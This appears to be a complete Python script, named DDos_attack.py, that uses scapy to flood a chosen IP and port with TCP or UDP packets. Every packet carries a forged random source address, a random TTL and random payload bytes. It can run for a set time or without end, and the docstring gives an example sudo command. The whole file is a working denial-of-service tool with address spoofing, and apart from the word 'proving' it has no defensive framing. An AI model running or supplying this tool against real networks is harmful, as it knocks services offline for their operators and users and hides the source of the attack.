#!/usr/bin/env python3
"""

Generating massive traffic; TCP or UPD with spoofed directions
for proving:
    sudo python3 DDos_attack.py --proto udp 10.12.0.10 5353 -s 1400 -d 120
"""
import argparse, os, random, threading, time
from scapy.all import IP, UDP, TCP, send, conf
conf.verb = 0

def blast(proto, dst_ip, dst_port, size, duration, iface):
    end = time.time() + duration if duration else None
    layer = UDP if proto == 'udp' else TCP
    payload = os.urandom(size)                 
    while True:
        if end and time.time() > end: break
        ip  = IP(src=f"198.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                 dst=dst_ip, ttl=random.randint(16,255))
        l4  = layer(sport=random.randint(1024,65535), dport=dst_port)
        send(ip/l4/payload, iface=iface, fast=True)

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('target_ip'); p.add_argument('target_port', type=int)
    p.add_argument('--proto', choices=['tcp','udp'], default='tcp')
    p.add_argument('-s','--size', type=int, default=1024, help='Bytes payload')
    p.add_argument('-d','--duration', type=int, default=0, help='seconds (0=infinite)')
    p.add_argument('-i','--iface', default=None)
    args = p.parse_args()
    print(f"[+] {args.proto.upper()} blast → {args.target_ip}:{args.target_port} "
          f"({args.size} B)")
    threading.Thread(target=blast,
                     args=(args.proto, args.target_ip, args.target_port,
                           args.size, args.duration, args.iface),
                     daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: pass
